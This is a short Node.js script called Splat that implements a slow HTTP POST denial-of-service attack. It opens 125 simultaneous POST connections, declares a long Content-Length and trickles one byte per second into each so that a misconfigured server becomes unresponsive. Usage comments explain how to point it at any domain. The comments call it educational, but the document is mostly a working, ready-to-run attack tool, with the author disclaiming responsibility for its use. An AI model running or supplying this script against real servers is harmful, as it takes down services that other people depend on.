//Splat is intended to be a demonstration of the HTTP POST Denial of Service attack described on http://www.acunetix.com/blog/web-security-zone/articles/http-post-denial-service/.
//This script is not meant for nefarious purposes but rather to educate and for testing.
//It is intended to demonstrate how opening lots of simultaneous POST connections to a server, specifying a long Content-Length, and feeding data to the server slowly can cause a mis-configured server to be made unresponsive.

//There's no license on this thing. The author takes no freaking responsibility for what dumbasses decide to do with what is a very basic script that took the author a few minutes to write. Use at your own risk, don't bother the author about it, feel free to fork it, pork it, or whatever you want.

//USAGE:
//1) Customize the "url" variable to a domain. DO NOT USE http:// or https://
//2) Set "max_connections" to how many simultaneous connections you want to open. 125 is recommended or Node might freak out.
//3) Set "length" to the total number of bytes that should be sent over time. Each byte is sent once per second.
//4) Run it from your terminal in the node-splat directory, "node app.js"
//5) If you don't know what Node.js is, go to http://nodejs.org

var http = require('http');

//This is the domain to connect to.
var url = 'localhost';

var max_connections = 125, //This is the number of simultaneous connections to open.
    length = 10000; //The total content length to send. 

var params = {
    'host': url,
    'Content-Length': length
}

//create a number of connections for the url
var connections = [];
for(var i=0; i<max_connections; i++){

    var obj = {}
        obj.cnx = http.createClient(80, url);
        obj.req = obj.cnx.request('post','/aaa/', params);

    connections.push(obj);

}

var next = function(cnt){
    
    for(var i=0; i<max_connections; i++){
        //request.write('a');
        connections[i].req.write('a');
    }
    
    console.log(cnt);
    cnt++;
    
    var x = setTimeout(function(){
        next(cnt);
    }, 1000);
    
    if( cnt > length ){
        clearInterval(x);

        for(var i=0; i<max_connections; i++){
            connections[i].req.end();
        }

    }
}

next(1);
